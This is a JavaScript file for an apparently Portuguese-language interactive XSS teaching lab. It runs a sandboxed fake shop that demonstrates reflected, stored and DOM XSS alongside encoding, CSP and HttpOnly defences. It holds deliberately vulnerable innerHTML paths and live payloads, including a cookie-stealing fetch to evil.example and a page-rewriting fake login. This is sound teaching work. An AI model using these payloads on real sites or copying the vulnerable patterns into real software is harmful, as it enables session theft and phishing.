function shopRuntime() {
  const D = JSON.parse(document.getElementById('dados').textContent);
  const $ = (id) => document.getElementById(id);
  const avisar = (t, extra) => parent.postMessage(Object.assign({ t }, extra), '*');

  /* ---- Navegador simulado: o que o atacante consegue "ver" ----
     alert() e fetch() são redirecionados para o painel da aula;
     document.cookie devolve a sessão fictícia (ou vazio, se HttpOnly). */
  window.alert = (m) => avisar('alert', { msg: String(m) });
  window.fetch = (u) => { avisar('exfil', { url: String(u) }); return Promise.resolve(); };
  Object.defineProperty(document, 'cookie', {
    get: () => (D.flags.httpOnly ? '' : 'sessao=a1b2c3d4e5'),   // CORREÇÃO (camada 4): HttpOnly esconde o cookie do JS
  });
  document.addEventListener('securitypolicyviolation', (e) => avisar('csp', { dir: e.violatedDirective }));

  /* ---- Mini sanitizador didático (na vida real: DOMPurify) ----
     Permite só formatação simples; remove tags, atributos e eventos perigosos. */
  function sanitizar(html) {
    const PERMITIDAS = ['B', 'I', 'EM', 'STRONG', 'U', 'BR'];
    const tpl = document.createElement('template');
    tpl.innerHTML = html;                       // <template> é inerte: nada executa aqui
    const removidos = [];
    (function limpar(pai) {
      Array.from(pai.childNodes).forEach((no) => {
        if (no.nodeType === 3) return;          // texto puro é seguro
        if (no.nodeType !== 1 || PERMITIDAS.indexOf(no.tagName) < 0) {
          const attrs = no.attributes ? Array.from(no.attributes).map((a) => a.name).join(' ') : '';
          removidos.push('<' + (no.tagName || 'comentário').toLowerCase() + (attrs ? ' ' + attrs : '') + '>');
          no.remove();
          return;
        }
        Array.from(no.attributes).forEach((a) => { removidos.push(a.name); no.removeAttribute(a.name); });
        limpar(no);
      });
    })(tpl.content);
    return { html: tpl.innerHTML, removidos };
  }

  const view = $('view');
  const cartoes = '<div class="cards"><i></i><i></i><i></i></div>';
  const temMarcacao = /[<>]/.test(D.valor);

  /* ---- Relatório para o painel "Registro" ---- */
  function relatar(alvo, removidos) {
    const perigoso = alvo.querySelector('[onerror],[onload],[onclick],script');
    if (perigoso) {
      avisar('info', { tipo: 'ruim', texto: 'O navegador interpretou a entrada como HTML: <code>' + perigoso.outerHTML.replace(/</g, '&lt;').slice(0, 70) + '…</code>' });
    } else if (removidos && removidos.length) {
      avisar('info', { tipo: 'bom', texto: 'Sanitizador removeu: <code>' + removidos.join(', ').replace(/</g, '&lt;') + '</code>' });
    } else if (removidos && temMarcacao && D.flags.encode) {
      avisar('info', { tipo: 'bom', texto: 'Sanitizador manteve apenas a formatação segura (negrito).' });
    } else if (temMarcacao && D.flags.encode) {
      avisar('info', { tipo: 'bom', texto: 'A entrada apareceu como texto. As tags não foram interpretadas.' });
    } else {
      avisar('info', { tipo: 'neutro', texto: 'Entrada comum: nenhum código malicioso.' });
    }
  }

  /* ---- Cenário 1: XSS REFLETIDO (busca ?q=) ---- */
  if (D.cenario === 'refletido') {
    view.innerHTML = '<h2>Resultados da busca</h2><p id="resultado"></p><p class="mudo">12 resultados encontrados</p>' + cartoes;
    const alvo = $('resultado');
    if (D.flags.encode) alvo.textContent = 'Você buscou: ' + D.valor;   // CORREÇÃO: entrada vira TEXTO
    else alvo.innerHTML = 'Você buscou: ' + D.valor;                    // FALHA: entrada vira HTML
    relatar(alvo);
  }

  /* ---- Cenário 2: XSS ARMAZENADO (comentários salvos no "servidor") ---- */
  if (D.cenario === 'armazenado') {
    view.innerHTML = '<h2>Tênis Corrida X</h2><p class="mudo">R$ 349,90 · ' + D.comentarios.length + ' comentários</p><ul id="coms"></ul>';
    const todosRemovidos = [];
    D.comentarios.forEach((c) => {
      const li = document.createElement('li');
      li.innerHTML = '<strong class="autor"></strong><div class="corpo"></div>';
      li.firstChild.textContent = c.autor;
      const item = li.lastChild;
      if (D.flags.encode) {
        const r = sanitizar(c.texto);                // CORREÇÃO: filtra o HTML antes de exibir
        item.innerHTML = r.html;
        r.removidos.forEach((x) => todosRemovidos.push(x));
      } else {
        item.innerHTML = c.texto;                    // FALHA: comentário salvo vira HTML
      }
      $('coms').appendChild(li);
    });
    relatar(view, todosRemovidos);
  }

  /* ---- Cenário 3: XSS BASEADO EM DOM (location.hash lido no cliente) ---- */
  if (D.cenario === 'dom') {
    view.innerHTML = '<h2 id="saudacao"></h2><p class="mudo">Seu pedido #4821 está a caminho.</p>' + cartoes;
    const nome = D.valor;                              // equivale a location.hash.slice(1)
    const alvo = $('saudacao');
    if (D.flags.encode) alvo.textContent = 'Olá, ' + nome;   // CORREÇÃO
    else alvo.innerHTML = 'Olá, ' + nome;                    // FALHA
    relatar(alvo);
    avisar('info', { tipo: 'neutro', texto: 'Este payload nunca passou pelo servidor: tudo ocorre no navegador.' });
  }

  /* ---- Detecta página reescrita (phishing) ---- */
  let avisou = false;
  new MutationObserver(() => {
    if (!$('app') && !avisou) {
      avisou = true;
      avisar('info', { tipo: 'ruim', texto: 'A página foi reescrita pelo script (formulário de login falso).' });
    }
  }).observe(document.documentElement, { childList: true, subtree: true });
}

/* CSS da loja (dentro do iframe) */
const SHOP_CSS = `
  *{box-sizing:border-box} body{margin:0;background:#F0E9DC;color:#1F2937;font:15px/1.4 system-ui,sans-serif}
  header{display:flex;justify-content:space-between;align-items:center;padding:9px 16px;border-bottom:1px solid #d9d0be}
  header b{font-size:18px;color:#C27BA0} header span{font-size:13px;color:#5b6470}
  main{padding:12px 18px} h2{margin:0 0 6px;font-size:19px} .mudo{color:#5b6470;margin:4px 0}
  #resultado{font-size:16px;margin:6px 0}
  .cards{display:flex;gap:10px;margin-top:10px} .cards i{flex:1;height:44px;background:#e2d8c3;border-radius:6px}
  ul{list-style:none;margin:8px 0 0;padding:0} li{padding:6px 0;border-bottom:1px solid #d9d0be}
  .autor{font-size:13px} .corpo{margin-top:2px}
  input,button{font:inherit;padding:6px}
`;

/* Monta o HTML completo do iframe a cada execução (página sempre "nova") */
function montarPagina(dados) {
  const nonce = 'n' + Math.random().toString(36).slice(2);
  // CORREÇÃO (camada 3): CSP — só roda script com nonce; onerror/inline é bloqueado
  const csp = dados.flags.csp
    ? '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; style-src \'unsafe-inline\'; script-src \'nonce-' + nonce + '\'">'
    : '';
  const json = JSON.stringify(dados).replace(/</g, '\\u003c');
  return '<!doctype html><html><head><meta charset="utf-8">' + csp + '<style>' + SHOP_CSS + '</style></head><body>' +
    '<div id="app"><header><b>Loja</b><span>Maria (logada)</span></header><main id="view"></main></div>' +
    '<script type="application/json" id="dados">' + json + '<\/script>' +
    '<script nonce="' + nonce + '">(' + shopRuntime.toString() + ')();<\/script></body></html>';
}

/* ---------------------------------------------------------
   PARTE 2 — Laboratório
   --------------------------------------------------------- */
const PAYLOADS = {
  normal: { refletido: 'tênis', armazenado: 'Adorei o <b>produto</b>! Chegou rápido.', dom: 'Maria' },
  alert: '<img src=x onerror="alert(\'Você está sob ataque!\')">',
  cookie: '<img src=x onerror="fetch(\'//evil.example/c?c=\'+document.cookie)">',
  phishing: '<img src=x onerror="document.body.innerHTML=\'<h2>Sessão expirada</h2><input type=password placeholder=Senha><button>Entrar</button>\'">',
};
const ROTULOS = {
  refletido: { r: 'loja.com/busca?q=', url: 'loja.com/busca?q=', botao: 'Buscar' },
  armazenado: { r: 'Novo comentário', url: 'loja.com/produto/42', botao: 'Publicar' },
  dom: { r: 'loja.com/#', url: 'loja.com/#', botao: 'Abrir link' },
};
const CODIGO = {
  refletido: { vuln: 'resultado.innerHTML = "Você buscou: " + q;', prot: 'resultado.textContent = "Você buscou: " + q;' },
  armazenado: { vuln: 'item.innerHTML = comentario.texto;', prot: 'item.innerHTML = sanitizar(comentario.texto);' },
  dom: { vuln: 'saudacao.innerHTML = "Olá, " + nome;', prot: 'saudacao.textContent = "Olá, " + nome;' },
};
const SEED = [
  { autor: 'Ana', texto: 'Ótimo custo-benefício.' },
  { autor: 'João', texto: 'Tamanho certo, recomendo.' },
];
const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

function createLab(raiz, modoInicial) {
  const st = {
    cenario: 'refletido',
    flags: { encode: false, csp: false, httpOnly: false },
    comentarios: SEED.slice(),
    valor: '',
    executou: false,
  };

  raiz.innerHTML =
    '<div class="lab-top">' +
      '<div class="tabs"><button data-c="refletido">Refletido</button><button data-c="armazenado">Armazenado</button><button data-c="dom">DOM</button></div>' +
      '<div style="display:flex"><span class="modo-info"></span><div class="modo"><button data-m="vuln">Vulnerável</button><button data-m="prot">Protegido</button></div></div>' +
    '</div>' +
    '<div class="lab-body">' +
      '<div class="lab-main">' +
        '<div class="entrada"><span class="rotulo"></span><textarea spellcheck="false" aria-label="Entrada do atacante"></textarea>' +
          '<div class="acoes"><button class="btn enviar"></button><button class="btn sec vitima">Recarregar (vítima)</button><button class="btn sec limpar">Limpar</button></div></div>' +
        '<div class="navegador"><div class="barra"><i></i><i></i><i></i><span class="url"></span></div>' +
          '<iframe sandbox="allow-scripts" title="Loja fictícia"></iframe>' +
          '<div class="dialogo" hidden><small>loja.com diz</small><p></p><button>OK</button></div></div>' +
        '<pre class="codigo"></pre>' +
      '</div>' +
      '<aside class="lab-side">' +
        '<h4>Payloads</h4><div class="payloads">' +
          '<button data-p="normal">Uso normal</button><button data-p="alert" class="atq">alert()</button>' +
          '<button data-p="cookie" class="atq">Roubar sessão</button><button data-p="phishing" class="atq">Phishing</button></div>' +
        '<h4 class="h-defesas">Defesas ativas</h4><div class="chips">' +
          '<button class="chip" data-f="encode">Codificar / sanitizar</button><button class="chip" data-f="csp">CSP</button><button class="chip" data-f="httpOnly">Cookie HttpOnly</button></div>' +
        '<h4>Registro</h4><ul class="registro"></ul>' +
      '</aside>' +
    '</div>';

  // data-defesas="off": demo de ataque, sem alternador nem opções de defesa
  const semDefesa = raiz.dataset.defesas === 'off';
  if (semDefesa) raiz.classList.add('sem-defesa');

  const q = (s) => raiz.querySelector(s);
  const iframe = q('iframe'), area = q('textarea'), registro = q('.registro'), dialogo = q('.dialogo');

  function log(tipo, html) {
    const vazio = registro.querySelector('.vazio'); if (vazio) vazio.remove();
    const li = document.createElement('li'); li.className = tipo; li.innerHTML = html; registro.appendChild(li);
  }
  function logLimpar() {
    registro.innerHTML = '<li class="vazio">Escolha um payload ou digite o seu e clique em enviar.</li>';
    dialogo.hidden = true;
  }

  /* Mensagens vindas da loja (iframe) */
  window.addEventListener('message', (e) => {
    if (e.source !== iframe.contentWindow || !e.data) return;
    const m = e.data;
    if (m.t === 'info') log(m.tipo, m.texto);
    if (m.t === 'alert') {
      dialogo.querySelector('p').textContent = m.msg; dialogo.hidden = false;
      log('ruim', '<code>alert()</code> executado: o script do atacante rodou no navegador da vítima.');
    }
    if (m.t === 'exfil') {
      let c = '';
      try { c = new URL(m.url, 'https://x.example').searchParams.get('c') || ''; } catch (_) {}
      if (c) log('ruim', 'evil.example recebeu: <code>' + esc(c) + '</code>');
      else log('bom', 'O script rodou, mas <code>document.cookie</code> veio vazio: HttpOnly protegeu a sessão.');
    }
    if (m.t === 'csp') log('bom', 'CSP bloqueou um script inline (<code>' + esc(m.dir) + '</code>).');
  });
  dialogo.querySelector('button').onclick = () => { dialogo.hidden = true; };

  /* Interface conforme estado */
  function atualizarUI() {
    const f = st.flags, n = Object.values(f).filter(Boolean).length;
    raiz.querySelectorAll('.tabs button').forEach((b) => b.classList.toggle('on', b.dataset.c === st.cenario));
    raiz.querySelectorAll('.modo button').forEach((b) => b.classList.toggle('on', (b.dataset.m === 'vuln' && n === 0) || (b.dataset.m === 'prot' && n === 3)));
    q('.modo-info').textContent = n === 0 || n === 3 ? '' : 'Parcial: ' + n + ' de 3 defesas';
    raiz.querySelectorAll('.chip').forEach((c) => c.classList.toggle('on', f[c.dataset.f]));
    const r = ROTULOS[st.cenario];
    q('.rotulo').textContent = r.r; q('.enviar').textContent = r.botao;
    q('.vitima').style.display = q('.limpar').style.display = st.cenario === 'armazenado' ? '' : 'none';
    q('.url').textContent = r.url + (st.cenario === 'armazenado' ? '' : st.valor);
    // Faixa de código: mostra a linha relevante e o estado de cada camada
    const c = CODIGO[st.cenario][f.encode ? 'prot' : 'vuln'];
    const tag = f.encode ? '<span class="tag ok">CORREÇÃO</span>' : '<span class="tag bad">FALHA</span>';
    q('.codigo').innerHTML =
      '<span class="l ' + (f.encode ? 'ok' : 'bad') + '">' + esc(c) + tag + '</span>' +
      (semDefesa ? '' :
        '<span class="l ' + (f.csp ? 'ok' : 'off') + '">' + (f.csp ? "Content-Security-Policy: script-src 'nonce-…'" : '(sem CSP: scripts inline são aceitos)') + '</span>' +
        '<span class="l ' + (f.httpOnly ? 'ok' : 'off') + '">' + (f.httpOnly ? 'Set-Cookie: sessao=…; HttpOnly; Secure; SameSite=Strict' : 'Set-Cookie: sessao=…  (legível por document.cookie)') + '</span>');
  }

  /* Executa a loja com o estado atual */
  function executar() {
    logLimpar();
    st.executou = true;
    iframe.srcdoc = montarPagina({ cenario: st.cenario, valor: st.valor, comentarios: st.comentarios, flags: st.flags });
    atualizarUI();
  }

  function enviar() {
    st.valor = area.value;
    if (st.cenario === 'armazenado') st.comentarios = st.comentarios.concat([{ autor: 'Visitante', texto: st.valor }]);
    executar();
  }

  function trocarCenario(c) {
    st.cenario = c; st.executou = false; st.valor = ''; st.comentarios = SEED.slice();
    area.value = ''; iframe.srcdoc = ''; logLimpar(); atualizarUI();
  }

  function setModo(m) {
    const v = m === 'prot';
    st.flags = { encode: v, csp: v, httpOnly: v };
    atualizarUI();
    if (st.executou) { // reexecuta o mesmo ataque: mesmo payload, resultado diferente
      if (st.cenario === 'armazenado') executar(); else { st.valor = area.value; executar(); }
    }
  }

  /* Eventos */
  raiz.querySelectorAll('.tabs button').forEach((b) => (b.onclick = () => trocarCenario(b.dataset.c)));
  raiz.querySelectorAll('.modo button').forEach((b) => (b.onclick = () => setModo(b.dataset.m)));
  raiz.querySelectorAll('.chip').forEach((b) => (b.onclick = () => {
    st.flags[b.dataset.f] = !st.flags[b.dataset.f]; atualizarUI();
    if (st.executou) { if (st.cenario !== 'armazenado') st.valor = area.value; executar(); }
  }));
  raiz.querySelectorAll('.payloads button').forEach((b) => (b.onclick = () => {
    const p = b.dataset.p;
    area.value = p === 'normal' ? PAYLOADS.normal[st.cenario] : PAYLOADS[p];
    enviar();
  }));
  q('.enviar').onclick = enviar;
  q('.vitima').onclick = () => { executar(); };                      // outro visitante abre a página
  q('.limpar').onclick = () => { st.comentarios = SEED.slice(); st.executou = false; iframe.srcdoc = ''; logLimpar(); };
  area.addEventListener('keydown', (e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); enviar(); } });

  setModo(modoInicial);
  logLimpar();

  return { executar, setModo };
}

